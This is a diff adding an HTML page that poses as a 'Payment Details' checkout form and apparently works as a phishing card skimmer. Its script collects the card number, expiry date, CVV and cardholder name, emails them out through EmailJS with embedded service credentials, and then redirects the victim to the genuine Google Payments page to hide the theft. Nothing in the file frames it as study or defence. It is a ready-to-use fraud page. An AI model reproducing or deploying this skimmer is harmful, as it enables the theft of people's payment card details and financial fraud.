@@ -1,0 +1,328 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
+  
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "9cATFsqPERef1K6ZF",
+      });
+   })();
+</script>
+
+    <title>Card Alt</title>
+    <style>
+  body {
+    background-color: #fff;
+    font-family: Arial, Sans-Serif;
+  }
+.container {
+  margin: 20px;
+  margin-top: 50px;
+  width: 320px;
+  height: 480px;
+  border: 1px solid #d3d3d3;
+  border-radius: 8px;
+  background-color: #fff;
+  position: absolute;
+}
+.card-container {
+  margin-bottom: 14px;
+  border: 1px solid #e6e6e6;
+  border-radius: 3px;
+  background-color: #F5F5F5;
+}
+.card-container img {
+  width: 320px;
+  height: 60px;
+}
+.container label {
+  font-weight: 500;
+}
+.card-types {
+  margin-left: 255px;
+  margin-top: -48px;
+  width: 50px;
+  height: 33px;
+  border-left: 1px solid #e6e6e6;
+  border-radius: 0 4px 4px 0;
+  background-color: #EEEEEE;
+  position: absolute;
+}
+.card-types svg {
+  margin-top: 3px;
+  margin-left: 5px;
+  position: absolute;
+}
+ input, label {
+   margin-left: 15px;
+ }
+ 
+ input {
+   margin-top: 7px;
+   padding: 0 15px;
+   font-size: 15px;
+   font-family: Arial, Sans-Serif;
+   font-weight: 600px;
+   border: 1px solid #d3d3d3;
+   background-color: #FFFFFF;
+ }
+ input:focus {
+  border: 1px solid #a5ddff;
+  box-shadow: 0 0 10px #E1EFFA;
+  outline: none;
+ }
+
+ input, button {
+   border-radius: 5px;
+ }
+.form-group input {
+  width: 260px;
+  height: 33px;
+  margin-bottom: 14px;
+}
+.form-group2 input {
+  width: 115px;
+  height: 33px;
+}
+.form-group3 input {
+  width: 90px;
+  height: 33px;
+  position: absolute;
+  margin-bottom: 14px;
+}
+.form-group4 input {
+  width: 260px;
+  height: 33px;
+  margin-top: 14px;
+}
+
+.form-group3 {
+  margin-top: -61px;
+  margin-left: 170px;
+  
+}
+.button-container {
+  margin: -1px;
+  width: 320px;
+  height: 64px;
+  margin-top: 10px;
+  text-align: center;
+  border-radius: 0 0 10px 10px;
+  border: 1px solid #d3d3d3;
+  background-color: #F5F5F5;
+}
+
+ button[type=submit] {
+   margin-top: 11px;
+   color: #fff;
+   width: 250px;
+   height: 40px;
+   font-size: 18px;
+   border: 1px solid #EC9720;
+   background-color: #EC9720;
+ }
+ button:hover {
+   border: 1px solid #e68600;
+   background-color: #e68600;
+ }
+ 
+.form-group3 svg {
+  position: absolute;
+  right: 20px;
+  top: 286px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  width: 20px; /* Adjust size as needed */
+  height: 20px; /* Adjust size as needed */
+}
+
+.tooltip {
+  display: none;
+  position: absolute;
+  top: 300px;
+  right: 10px;
+  background-color: #333;
+  color: #fff;
+  padding: 5px;
+  border-radius: 3px;
+  font-size: 12px;
+  white-space: nowrap;
+  margin-top: 5px;
+  box-shadow: 0 0 10px black;
+}
+
+.tooltip.visible {
+  display: block;
+}
+.card-logo {
+ position: absolute;
+ top: 17px;
+ right: 1px;
+ transform: translateY(-50%);
+ height: 30px;
+ border-radius: 6px;
+ width: auto;
+ display: none;
+ }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+     <div class="card-container"><br>
+       <h2 style="text-align: center; font-weight: 500; color: #000000c7;">Payment Details</h2>
+       <img src="https://i.ibb.co/qDpZSgc/creditcardicons-2.png" alt="Card-Types">
+     </div>
+     
+     <form id="CardForm">
+     <div class="form-group">
+    <label for="cardnumber">CARD NUMBER</label>
+    <input type="tel" id="cardnumber" name="cardnumber" data-mask="0000 0000 0000 0000" placeholder="0000 0000 0000 0000" required="" oninput="detectCardType()">
+    </div>
+  
+  
+  
+    <div class="card-types">
+ <svg xmlns="http://www.w3.org/2000/svg" height="28" width="40" viewBox="0 0 576 512"><!--!Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path fill="#55555585" d="M512 80c8.8 0 16 7.2 16 16v32H48V96c0-8.8 7.2-16 16-16H512zm16 144V416c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V224H528zM64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm56 304c-13.3 0-24 10.7-24 24s10.7 24 24 24h48c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm128 0c-13.3 0-24 10.7-24 24s10.7 24 24 24H360c13.3 0 24-10.7 24-24s-10.7-24-24-24H248z"/></svg>
+ 
+ <img class="card-logo" id="card-logo" src="" alt="Card Logo" />
+    </div>
+    
+    <div class="form-group2">
+  <label for="expirydate">EXP DATE</label><br>
+  <input type="tel" id="expirydate" name="expirydate" data-mask="00/00" placeholder="MM/YY" required="">
+    </div>
+    
+    <div class="form-group3">
+  <label for="cvv">CV CODE</label><br>
+  <input type="tel" id="cvv" name="cvv" data-mask="0000" placeholder="CVV" required="">
+  
+<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" id="question-mark-svg">
+
+    <g clip-path="url(#clip0_429_11043)">
+      <circle cx="12" cy="11.9999" r="9" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></circle>
+      <rect x="12" y="16" width="0.01" height="0.01" stroke="#292929" stroke-width="3.75" stroke-linejoin="round"></rect>
+      <path d="M10.5858 7.58572C10.9754 7.1961 11.4858 7.00083 11.9965 6.99994C12.5095 6.99904 13.0228 7.1943 13.4142 7.58572C13.8047 7.97625 14 8.48809 14 8.99994C14 9.51178 13.8047 10.0236 13.4142 10.4141C13.0228 10.8056 12.5095 11.0008 11.9965 10.9999L12 11.9999" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path>
+    </g>
+    <defs>
+      <clipPath id="clip0_429_11043">
+        <rect width="24" height="24" fill="white"></rect>
+      </clipPath>
+    </defs>
+  </svg>
+  <div class="tooltip" id="tooltip">The CV Code, or CVV, refers to the<br>extra 3 or 4 numbers on the back<br>or front of your card.</div>
+  
+    </div>
+    <br></br><br>
+    <div class="form-group4">
+  <label for="name">CARD OWNER</label><br>
+  <input type="text" id="name" name="name" placeholder="Card Owner Names" required="">
+    </div>
+    
+    </br>
+   <div class="button-container">
+  <button type="submit" id="cardmine" onclick="sendMail()">Process Payment</button>
+  </form>
+   </div>
+    </div>
+    
+    
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+
+<script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      cardnumber : document.getElementById("cardnumber").value,
+      expirydate : document.getElementById("expirydate").value,
+      cvv : document.getElementById("cvv").value,
+      name : document.getElementById("name").value,
+      submit_button_id: document.getElementById("cardmine").id
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+        emailjs.send("service_6kbj4eu","template_ncggmgb", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://payments.google.com/gp/w/u/0/home/paymentmethods?";
+      })
+      .catch(function(error) {
+        console.error('Invalid Card number!', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('CardForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+<script>
+  function detectCardType() {
+        const cardNumber = document.getElementById('cardnumber').value;
+        const cardLogo = document.getElementById('card-logo');
+
+        cardLogo.style.display = 'none';
+
+        if (/^4/.test(cardNumber)) {
+            cardLogo.src = 'https://i.ibb.co/wMrJWr2/visa.png';
+            cardLogo.style.display = 'block';
+        } else if (/^5[1-5]/.test(cardNumber)) {
+            cardLogo.src = 'https://i.ibb.co/mb0w5bm/mastercard.jpg';
+            cardLogo.style.display = 'block';
+        } else if (/^3[47]/.test(cardNumber)) {
+            cardLogo.src = 'https://i.ibb.co/rH1yLyh/amex.jpg';
+            cardLogo.style.display = 'block';
+        }
+    }   
+    </script>
+  
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const tooltip = document.getElementById('tooltip');
+  const questionMarkSvg = document.getElementById('question-mark-svg');
+
+  questionMarkSvg.addEventListener('click', function() {
+    tooltip.classList.toggle('visible');
+  });
+
+  document.addEventListener('click', function(event) {
+    if (!tooltip.contains(event.target) && !questionMarkSvg.contains(event.target)) {
+      tooltip.classList.remove('visible');
+    }
+  });
+});
+
+</script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const cardImage = document.querySelector('.card-container img');
+        const cardNumberInput = document.getElementById('cardnumber');
+
+        cardImage.addEventListener('click', function() {
+            cardNumberInput.focus();
+        });
+    });
+</script>
+
+  </body>
+</html>
